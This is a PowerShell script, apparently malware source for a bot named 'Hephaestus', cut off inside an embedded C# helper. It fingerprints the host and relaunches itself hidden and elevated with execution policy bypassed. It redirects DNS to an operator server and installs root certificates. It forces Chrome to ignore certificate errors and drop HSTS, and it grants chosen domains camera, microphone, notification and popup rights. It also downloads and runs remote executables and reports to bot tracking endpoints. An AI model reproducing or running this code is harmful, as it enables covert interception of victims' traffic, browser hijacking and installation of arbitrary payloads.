
$server = @'
{
  "version": "2026.04.03 13:33:47",
  "urlDoc": "",
  "disabled": false,
  "disableVirus": false,
  "serverIp": "192.168.0.92",
  "server": "default",
  "htmlTemplateSponsorFile": "C:\\soft\\hephaestus\\php\\.\\download.html",
  "primaryDns": "192.168.0.92",
  "secondaryDns": "192.168.0.92",
  "extraUpdate": false,
  "updateUrl": "http://192.168.0.92/bot/update",
  "track": true,
  "trackDesktop": false,
  "trackUrl": "http://192.168.0.92/bot/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "aggressiveAdmin": true,
  "aggressiveAdminDelay": 30,
  "aggressiveAdminAttempts": 0,
  "aggressiveAdminTimes": 0,
  "pushesForce": true,
  "pushes": [],
  "startDownloadsForce": true,
  "startDownloads": [],
  "startUrlsForce": false,
  "startUrls": [],
  "frontForce": false,
  "front": [],
  "embeddingsForce": false,
  "embeddings": [],
  "certToolExe": "C:\\soft\\hephaestus\\output\\certtool.exe"
}
'@ | ConvertFrom-Json




        $xdata = @{
        
    }
        



        $xfront = @(
        
        )
        $xfront_name = @(
        
        )
        $xembed = @(
        
        )
        $xembed_name = @(
        
        )


function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$machineCode = ""

function Get-MachineCode {

    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
    {
        return $machineCode
    }
    try {
        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
    
        $combinedString = "$biosSerial$mbSerial$macAddress"
    
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
        $hashBytes = $sha256.ComputeHash($bytes)
    
        # Convert to Base64 and take the first 12 characters
        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
        
        $machineCode = $hashString.Substring(0, 12)
    }
    catch 
    {
        $machineCode = "Hephaestus"
    }
    return $machineCode
}

$hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"

$globalDebug = IsDebug;

function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )
    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)

        $memoryStream = New-Object System.IO.MemoryStream(,$decodedBytes)
        $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream

        $gzipStream.CopyTo($outputStream)
        $gzipStream.Close()
        $memoryStream.Close()

        [System.IO.File]::WriteAllBytes($outFile, $outputStream.ToArray())
    }
    catch {
        writedbg "Failed to decode to file $outFile and decompress: $_"
    }
}

function Get-SHA256HashBase64 {
    param ([string]$inputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $hashBytes = $sha256.ComputeHash($byteArray)
    return [Convert]::ToBase64String($hashBytes)
}

function CustomDecodeEnveloped {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $parsed = $inContent | ConvertFrom-Json
    $evalHash = Get-SHA256HashBase64($parsed.json)
    if ($evalHash -ne $parsed.hash)
    {
        throw "Wrong Hash";
    }
    return CustomDecode -inContent $parsed.json -outFile $outFile
}

function EnvelopeIt {
    param ([string]$inputString)
    
    $hash = Get-SHA256HashBase64 -inputString $inputString
    
    $envelope = @{
        json = $inputString
        hash = $hash
    }
    
    return ($envelope | ConvertTo-Json)
}

function ModifyUrl {
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    

    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
    }
    else
    {
        $domainParts = @(Get-RandomString) + $domainParts
    }
    $newHost = ($domainParts -join '.')
    
    $newQuery = $uri.Query
    $randomArg = "xxx=" + (Get-RandomString)
    
    if ($newQuery) {
        if ($newQuery.StartsWith('?')) {
            $newQuery = "?" + $randomArg + "&" + $newQuery.Substring(1)
        }
    } else {
        $newQuery = "?" + $randomArg
    }
    
    if ($uri.Port -ne 80 -and $uri.Port -ne 443) {
        $newUrl = $uri.Scheme + "://" + $newHost + ":" + $uri.Port + $uri.AbsolutePath + $newQuery
    } else {
        $newUrl = $uri.Scheme + "://" + $newHost + $uri.AbsolutePath + $newQuery
    }
    
    return $newUrl
}

function GoogleUrl{
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    
    if ($domainParts.Length -gt 2) {
        $newHost = $domainParts[0] + '-' + $domainParts[1] + '-' + $domainParts[2]
    } else {
        $newHost = $domainParts[0] + '-' + $domainParts[1]
    }

    $newUrl = "https://" + $newHost + ".translate.goog" + $uri.AbsolutePath + "?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=ru&_x_tr_pto=wapp"
    
    return $newUrl
}


function Get-RandomString {
    $length = 8
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}


function SmartServerlUrl{
    param ([string]$url)
         $url = ModifyUrl -url $url
         return $url
}


function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineCode))
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function GetArg {
    param ([string]$arg)

    $globalArgs = $global:args
    $arg = $arg.ToLower()

    for ($i = 0; $i -lt $globalArgs.Count; $i++) {
        $currentArg = $globalArgs[$i].TrimStart("-").ToLower()
        if ( (ArgsEqual $currentArg $arg) -and $i + 1 -lt $globalArgs.Count) {
            return $globalArgs[$i + 1]
        }
    }

    return ""
}

function StrToInt {
    param ([string]$value)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return 0
    }

    $intValue = 0
    if ([int]::TryParse($value, [ref]$intValue)) {
        return $intValue
    }

    return 0
}

function StrToBool {
    param ([string]$value, [bool]$default)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $default
    }

    $boolValue = $default
    if ([bool]::TryParse($value.ToLower(), [ref]$boolValue)) {
        return $boolValue
    }

    return $default
}

function RegWrite {
    param (
        [string]$registryPath,
        [string]$keyName,
        [string]$value
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $value) {
                writedbg "The '$keyName' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $value
                writedbg "'$keyName' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value "$value" -PropertyType String -Force | Out-Null
            writedbg "'$keyName' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the '$keyName' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function RegWriteInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )

    RegWrite -registryPath $registryPath -keyName $keyName -value $value.ToString()
}

function RegRead {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
            $res = $currentValue.$keyName
            if ($null -eq $res)
            {
                $res = "";
            }
            return $res
        }
    } catch {
        writedbg "Error reading registry key '$keyName' from '$registryPath': $($_.Exception.Message)" -ForegroundColor Red
    }

    return ""
}

function RegReadInt {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToInt -value $value
}

function RegReadBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$default
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToBool -value $value -default $default
}

function RegWriteParam {
    param (
        [string]$keyName,
        [string]$value
    )
    $registryPath = $hepaestusReg
    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function RegWriteParamInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString()
}

function RegWriteParamBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString().ToLower()
}

function RegReadParam {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegRead -registryPath $registryPath -keyName $keyName
}

function RegReadParamInt {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegReadInt -registryPath $registryPath -keyName $keyName
}

function RegReadParamBool {
    param (
        [string]$keyName,        [bool]$default
    )
    $registryPath = $hepaestusReg
    return RegReadBool -registryPath $registryPath -keyName $keyName -default $default
}

function GetArgInt {
    param ([string]$arg)

    return StrToInt (GetArg $arg)
}

function EnsureDashPrefix {
    param ([string]$value)

    if (-not $value.StartsWith("-")) {
        return "-" + $value
    }
    return $value
}

function ArgsEqual {
    param (
        [string]$arg1,
        [string]$arg2
    )

    # Normalize both arguments (remove leading "-" and compare case-insensitively)
    $normalizedArg1 = $arg1.TrimStart("-").ToLower()
    $normalizedArg2 = $arg2.TrimStart("-").ToLower()

    return $normalizedArg1 -eq $normalizedArg2
}

function RunMe {
    param (
        [string]$script, 
        [bool] $repassArgs,
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    $argName = EnsureDashPrefix -value $argName

    $scriptPath = $script
    
    $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
    
    if ($repassArgs -eq $true) {
        $globalArgs = $global:args
        $filteredArgs = @()
        $skipNext = $false

        for ($i = 0; $i -lt $globalArgs.Count; $i++) {
            if ($skipNext) 
            {
                $skipNext = $false
                continue
            }

            if (ArgsEqual $globalArgs[$i] $argName) {
                $skipNext = $true
                continue
            }

            $filteredArgs += $globalArgs[$i]
        }
        $globalArgs = $filteredArgs
        $local += $globalArgs
        if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
            $local += $argName
            $local += $argValue
        }
    }

    $argumentList = ""
    for ($i = 0; $i -lt $local.Count; $i += 1) {
        $arg = $local[$i]
        $argumentList += "$arg "
    }

    writedbg "starting  $argumentList"

    if ($globalDebug)
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Normal -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Normal -ArgumentList $argumentList
        }
    }
    else 
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }

}

function IsElevatedOld
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}

function IsElevated {
    $winID = [Security.Principal.WindowsIdentity]::GetCurrent()
    $princ = New-Object Security.Principal.WindowsPrincipal($winID)
    return $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -and $winID.Owner -ne $winID.User
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}




function Get-FileNameFromUri {
    param (
        [string]$uri
    )

    # Create a Uri object
    $uriObject = [System.Uri]::new($uri)

    # Extract the file name from the path of the URI
    $fileName = [System.IO.Path]::GetFileName($uriObject.AbsolutePath)

    return $fileName
}

function Add-RandomDigitsToFilename {
    param (
        [string]$fileName
    )

    # Split filename into base and extension
    $baseName = $fileName -replace '\.[^.]+$', ''
    $extension = $fileName -replace '.*\.', '.'

    # Generate a random number between 1000 and 9999
    $randomNumber = Get-Random -Minimum 1000 -Maximum 9999

    # Combine base name, random number, and extension
    $newFileName = "$baseName" + "_$randomNumber$extension"

    return $newFileName
}

function Start-DownloadAndExecute {
    param (
        [string]$url,
        [string]$title
    )

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    
    public static class FormHelper {
        const int SW_RESTORE = 9;
        const int SW_SHOW = 5;
    
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);
    
        [DllImport("user32.dll")]
        private static extern bool BringWindowToTop(IntPtr hWnd);
    
        public static void ForceShow(Form form) {
            IntPtr handle = form.Handle;
    
            // Restore if minimized, then bring to front
            ShowWindow(handle, SW_RESTORE);
            BringWindowToTop(handle);
            SetForegroundWindow(handle);
    
            // Temporarily make it topmost to force visibility, then undo
            form.TopMost = true;
            form.Activate();
            form.TopMost = false;
        }
    }
"@ -ReferencedAssemblies 'System.Windows.Forms'

    # Create and configure the form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = $title
    $form.Size = New-Object System.Drawing.Size(400, 200)
    $form.StartPosition = "CenterScreen"
    [FormHelper]::ForceShow($form)

    # Create and configure the progress bar
    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Minimum = 0
    $progressBar.Maximum = 100
    $progressBar.Step = 1
    $progressBar.Value = 0
    $progressBar.Width = 350
    $progressBar.Height = 30
    $progressBar.Top = 80
    $progressBar.Left = 20
    $form.Controls.Add($progressBar)

    # Create and configure the status label
    $statusLabel = New-Object System.Windows.Forms.Label
    $statusLabel.Text = "Downloading..."
    $statusLabel.AutoSize = $true
    $statusLabel.Top = 50
    $statusLabel.Left = 20
    $form.Controls.Add($statusLabel)

    # Create and configure the description label
    $descriptionLabel = New-Object System.Windows.Forms.Label
    $descriptionLabel.Text = "Please wait until the process completes..."
    $descriptionLabel.AutoSize = $true
    $descriptionLabel.Width = 350
    $descriptionLabel.Top = 10
    $descriptionLabel.Left = 20
    $form.Controls.Add($descriptionLabel)

    $form.Show()
    $form.TopMost = $true
    $form.Activate()
    $form.TopMost = $false
    $form.Focus()

    $fileName = Get-FileNameFromUri -uri $url
    $fileNameSave = Add-RandomDigitsToFilename -fileName $fileName

    $tempDir = (Get-HephaestusFolder)
    $installerPath = [System.IO.Path]::Combine($tempDir, $fileNameSave)
    if (-not [System.IO.Path]::GetExtension($installerPath)) {
        $installerPath += ".exe"
    }

    $webClient = New-Object System.Net.WebClient

    $progressChangedHandler = [System.Net.DownloadProgressChangedEventHandler]{
        param ($sender, $eventArgs)
        $roundedProgress = [math]::Round($eventArgs.ProgressPercentage / 3) * 3
        $progressBar.Value = $roundedProgress
    }

    $downloadFileCompletedHandler = [System.ComponentModel.AsyncCompletedEventHandler]{
        param ($sender, $eventArgs)
        $form.Invoke([action] { 
            [System.Windows.Forms.Application]::DoEvents()
            $form.Close() 
            [System.Windows.Forms.Application]::DoEvents()
        })
        
        if ($eventArgs.Error) {
            [System.Windows.Forms.MessageBox]::Show("Error downloading file: " + $eventArgs.Error.Message, "Download Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        } elseif ($eventArgs.Cancelled) {
            [System.Windows.Forms.MessageBox]::Show("Download cancelled.", "Download Cancelled", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        } else {
            try {
                # Execute the installer
                Start-Process -FilePath $installerPath -Wait

                # Write to the registry
                $registryPath = "$hepaestusReg\download"
                if (-not (Test-Path $registryPath)) {
                    New-Item -Path $registryPath -Force | Out-Null
                }
                Set-ItemProperty -Path $registryPath -Name $fileName -Value "Downloaded"
            } catch {
                [System.Windows.Forms.MessageBox]::Show("Error executing the installer: " + $_.Exception.Message, "Execution Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            }
        }
        [System.Windows.Forms.Application]::DoEvents()
    }

    $webClient.add_DownloadProgressChanged($progressChangedHandler)
    $webClient.add_DownloadFileCompleted($downloadFileCompletedHandler)

    try {
        $webClient.DownloadFileAsync([Uri]$url, $installerPath)
        
        while ($form.Visible) {
            Start-Sleep -Milliseconds 1
            [System.Windows.Forms.Application]::DoEvents()
        }
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Error initiating download: " + $_.Exception.Message, "Download Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        $form.Close()
    }
}



function Download {
    param (
        [string]$url,
        [string]$title
    )

    $fileName = [System.IO.Path]::GetFileName($url)

    $auto = Test-Autostart;
    if ($server.startDownloadsForce -ne $false -and $auto -eq $true)
    {
        $registryPath = "$hepaestusReg\download"
        if (Test-Path $registryPath) {
            $installed = Get-ItemProperty -Path $registryPath -Name $fileName -ErrorAction SilentlyContinue
            if ($installed) 
            {
                writedbg "The file '$fileName' is already installed."
                return
            }
        }
        return
    }

    Start-DownloadAndExecute -url $url -title $title
}

function do_startdownloads {
    try 
    {
        $baseDn = RegReadParam -keyName "download"
        if (-not [string]::IsNullOrEmpty($baseDn))
        {
            Download -url $baseDn -title "Please wait..."
        }
        foreach ($url in $server.startDownloads)
        {
            if ($url -eq $baseDn) {
                continue
            }
            Download -url $url -title "Please wait..."
        }
    }
    catch {
      writedbg "An error occurred (Start Downloads): $_"
    }
}






function Set-DnsServers {
    param (
        [string]$primaryDnsServer,
        [string]$secondaryDnsServer
    )

    try {
        # Get network adapters that are IP-enabled
        $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notlike '*Virtual*' }

        foreach ($adapter in $networkAdapters) {
            # Set DNS servers using Set-DnsClientServerAddress cmdlet
            Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($primaryDnsServer, $secondaryDnsServer) -Confirm:$false
            
            writedbg "Successfully set DNS servers for adapter: $($adapter.InterfaceDescription)"
        }
    } catch {
        writedbg "An error occurred: $_"
    }
}

function do_dnsman {
    if ($globalDebug)
    {
        return;
    }
    $name=$env:COMPUTERNAME
    if ($name -eq "WIN-5V5DB9GE2L4")
    {
        return
    }
    Set-DnsServers -PrimaryDNSServer $server.primaryDns -SecondaryDNSServer $server.secondaryDns
}





function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    CustomDecode -inContent $contentString -outFile $outputFilePath

    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Install for Local Machine
        $stores = @("Cert:\LocalMachine\My", "Cert:\LocalMachine\Root")

        # Install for Current User
        $stores += @("Cert:\CurrentUser\My", "Cert:\CurrentUser\Root")

        foreach ($store in $stores) {
            Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $store -Password $securePassword -ErrorAction Stop
            Write-Host "Certificate installed successfully to $store"
        }
    } catch {
        throw "Failed to install certificate: $_"
    }
}

function do_cert {
    try 
    {
        foreach ($key in $xdata.Keys) {
            Cert-Work -contentString $xdata[$key]
        }
    }
    catch {
        writedbg "An error occurred (ConfigureCertificates): $_"
      }
}






function do_chrome {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0

    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"

    if (-not (Test-Path $chromeKeyPath)) {
        New-Item -Path $chromeKeyPath -Force | Out-Null
    }

    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1

    writedbg "Chrome configured"
}







function Compare-Arrays {
    param (
        [array]$Array1,
        [array]$Array2
    )

    # Sort both arrays and compare
    $array1Sorted = $Array1 | Sort-Object | Get-Unique
    $array2Sorted = $Array2 | Sort-Object | Get-Unique

    $jo1 = $array1Sorted -join ',' 
    
    $jo2 = $array2Sorted -join ','

    # Determine if the arrays are equal (order does not matter)
    if ($jo1 -eq $jo2 ) {
        return $true
    } else {
        return $false
    }
}


function HaveToPushes {
    $result = $false;
    $exists = @()
    $toset = @()
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $exists += PushDomain -pushUrl $siteUrl
            }
        }
    }

    foreach ($push in $server.pushes) {
        $toset += PushDomain -pushUrl $push
    }

     $result = -not(Compare-Arrays -Array1 $exists -Array2 $toset)
    
    return $result;
}


function PushDomain {
    param ($pushUrl)

    # Trim the input string before the first comma
    $trimmedUrl = $pushUrl.Trim().Split(',')[0].Trim()

    # Parse the URI
    $parsedUri = [System.Uri]::new($trimmedUrl)
    
    # Extract domain and port
    $domain = $parsedUri.Host
    $port = if ($parsedUri.Port -eq -1) { 443 } else { $parsedUri.Port }

    # Construct the result URL
    $result = "https://" + $domain + ":" + "$port,*"
    
    return $result
}

function PushExists
{
    param ($pushUrl)
    foreach ($push in $server.pushes) 
    {
        if ((PushDomain -pushUrl $pushUrl) -eq (PushDomain -pushUrl $push))
        {
            return $true;
        }
    }
    return $false
}

function Remove-Pushes {
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            $keysToRemove = @()

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $permission = (PushExists -pushUrl $siteUrl)
            
                if ($permission -eq $false) {
                    $keysToRemove += $field.Name
                } else {
                    writedbg "$siteUrl hasn't been removed, it is a good site."
                }
            }

            foreach ($key in $keysToRemove) {
                $notificationSettings.PSObject.Properties.Remove($key)
            }

            $preferencesContent | ConvertTo-Json -Depth 100 | Set-Content -Path $preferencesPath -Force

            writedbg "All selected push notification settings have been removed."
        } else {
            writedbg "No or unexpected notification settings found in Preferences file."
        }
    } else {
        writedbg "Preferences file not found at path: $preferencesPath"
    }
}

function Add-Pushes{
    foreach ($push in $server.pushes) {
        Add-Push -pushUrl $push -work $work
    }
}

function Add-Push {
    param (
        [string]$pushUrl
    )

    $pushDomain = PushDomain -pushUrl $pushUrl

    $chromePreferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (-not (Test-Path -Path $chromePreferencesPath)) {
        writedbg "Chrome preferences file not found at path: $chromePreferencesPath"
        exit
    }

    $preferencesContent = Get-Content -Path $chromePreferencesPath -Raw | ConvertFrom-Json

    if (-not $preferencesContent.profile) {
        $preferencesContent | Add-Member -MemberType NoteProperty -Name profile -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values) {
        $preferencesContent.profile | Add-Member -MemberType NoteProperty -Name default_content_setting_values -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values.popups) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name popups -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.popups = 1
    }

    if (-not $preferencesContent.profile.default_content_setting_values.subresource_filter) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name subresource_filter -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.subresource_filter = 1
    }

    $preferencesContentJson = $preferencesContent | ConvertTo-Json -Depth 32
    Set-Content -Path $chromePreferencesPath -Value $preferencesContentJson -Force

    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
        $contentSettings = $preferencesContent.profile.content_settings.exceptions
        $settingsToUpdate = @(
            "auto_picture_in_picture", "background_sync", "camera", "clipboard", "cookies", 
            "geolocation", "images", "javascript", "microphone", "midi_sysex", 
            "notifications", "popups", "plugins", "sound", "unsandboxed_plugins", 
            "automatic_downloads", "flash_data", "mixed_script", "sensors","window_placement","webid_api","vr",
            "subresource_filter","media_stream_mic","media_stream_mic","media_stream_camera","local_fonts",
            "javascript_jit","idle_detection","captured_surface_control","ar"

        )

        foreach ($setting in $settingsToUpdate) {
            if ($null -eq $contentSettings.$setting) {
                $contentSettings | Add-Member -MemberType NoteProperty -Name $setting -Value @{}
            }
            $specificSetting = $contentSettings.$setting
            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {            
            } else {
                $specificSetting | Add-Member -MemberType NoteProperty -Name $pushDomain -Value @{
                    "last_modified" = "13362720545785774"
                    "setting" = 1
                }
                $contentSettings.$setting = $specificSetting
            }
        }

        $preferencesContent.profile.content_settings.exceptions = $contentSettings
        $updatedPreferencesJson = $preferencesContent | ConvertTo-Json -Depth 10
        $updatedPreferencesJson | Set-Content -Path $preferencesPath -Encoding UTF8

        writedbg "Notification subscription for $pushDomain added successfully with all permissions."
    } else {
        writedbg "Preferences file not found at path: $preferencesPath"
    }
}



function Close-ChromeWindow {
    param ($window)
    [User32X]::CloseWindow($window) | Out-Null
    Start-Sleep -Milliseconds 25
}

function Close-Chrome {
    param ($process)
    Close-ChromeWindow -window $process.MainWindowHandle
    try {
        $process.Close()
    }
    catch {
  
    }
}


function Close-AllChromes {
    $windows = [User32X]::EnumerateAllWindows()
    foreach ($window in $windows) 
    {
        $title = [User32X]::GetWindowText($window)
        if ($title.Contains("Google Chrome"))
        {
            [User32X]::ShowWindow($window, [User32X]::SW_HIDE) | Out-Null
            Close-ChromeWindow -window $window
        }
    }
    Close-Processes(@('chrome.exe'))
    Start-Sleep -Milliseconds 5
}

function ConfigureChromePushes {
    $auto = Test-Autostart;
    if ($server.pushesForce -ne $false -and $auto -eq $true)
    {
        writedbg "Skipping ConfigureChromePushes"
        return
    }
    try {
        
   

    Add-Type @"
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Text;

    public static class User32X {
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        public static string GetWindowText(IntPtr hWnd) {
            int length = GetWindowTextLength(hWnd);
            if (length == 0) return String.Empty;

            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        public static bool IsWindowVisibleEx(IntPtr hWnd) {
            return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
        }

        public static IntPtr[] EnumerateAllWindows() {
            var windowHandles = new List<IntPtr>();
